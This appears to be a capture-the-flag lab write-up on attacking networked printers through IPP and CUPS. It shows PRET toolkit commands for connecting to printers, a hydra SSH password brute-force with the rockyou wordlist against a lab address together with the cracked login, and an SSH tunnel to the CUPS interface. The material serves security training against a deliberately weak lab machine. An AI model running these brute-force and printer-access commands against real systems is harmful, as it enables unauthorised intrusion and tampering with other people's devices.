
# Why can we hack printers

"The Internet Printing Protocol (IPP) -
is a specialized Internet protocol for
communication between client devices and printers.
It allows clients to submit one or more print jobs to the printer or print server,
and perform tasks such as querying the status of a printer,
obtaining the status of print jobs, or canceling individual print jobs."  

When an IPP port is open to the internet,
it is possible for anyone to print to the printer or even transfer
malicious data through it (using it as a middleman for attacks).  

A recent study by VARIoT (Vulnerability and Attack Repository for IoT)
showed that there are still around
80 thousand vulnerable printers opened to the world.
Most of them appear to run the CUPS server
(which is a simple UNIX printing system).  

IPP runs on port 631

# How to exploit it

There's an awesome toolkit in github:
[here](https://github.com/RUB-NDS/PRET)

Install it by:

```bash
git clone https://github.com/RUB-NDS/PRET && cd PRET
python2 -m pip install colorama pysnmP
```

##### Locating printers

For automatic printer discovery in my local network:

```bash
python pret.py
```

##### Exploiting

There are exactly three options you need to try when exploiting a printer using PRET:

1. ps (Postscript)
2. pjl (Printer Job Language)
3. pcl (Printer Command Language)

You need to try out all three languages just to see which one is going to be
understood by the printer.  

Sample Usage:

```bash
python pret.py {IP} pjl
python pret.py laserjet.lan ps
python pret.py /dev/usb/lp0 pcl
```

(Last option works if you have a printer connected to your computer already)

After running this command,
you are supposed to get shell-alike output with different commands.
Run help to see them.

As you can see, PRET allows us to interact with the
printer as if we were working with a remote directory.
We can now store, delete, or add information on the printer.  
(For more commands and examples read the project's GitHub)

You can possibly try PRET on your printer at home, just to test its security.
Here's a nice cheat sheet:
[cheat-sheet](http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet)

# Our Challenge

I have attached a poorly configured CUPS server VM in this task.
Deploy it and access the IPP port at 10.10.166.231:631.
See if you can retrieve any sensitive information.  
(PRET isn't going to work here as it is using port 9000 by default)

Note also: An ssh access to the machine allows you to set up ssh tunneling,
opening all CUPS features and providing you an ability to use attached printers.
SSH password can be easily brute-forced (weak password).  

An example command for ssh tunneling:

```bash
ssh printer@10.10.166.231 -T -L 3631:localhost:631
```

After doing so, you can easily add the CUPS server in your VM's printer settings
and even try to send some printing jobs.  

My tasks:

1. So I have to brute force the password of ssh
2. Forward the printer to my localhost
3. Enum the web-site

After running:

```bash
hydra -l printer -P /usr/share/wordlists/rockyou.txt 10.10.166.231 ssh
```

I get:

```bash
[22][ssh] host: 10.10.166.231   login: printer   password: password123
1 of 1 target successfully completed, 1 valid password found
```

To access the webpage

```bash
ssh printer@10.10.166.231 -T -L 3631:localhost:631
```

Navigate to localhost:3631
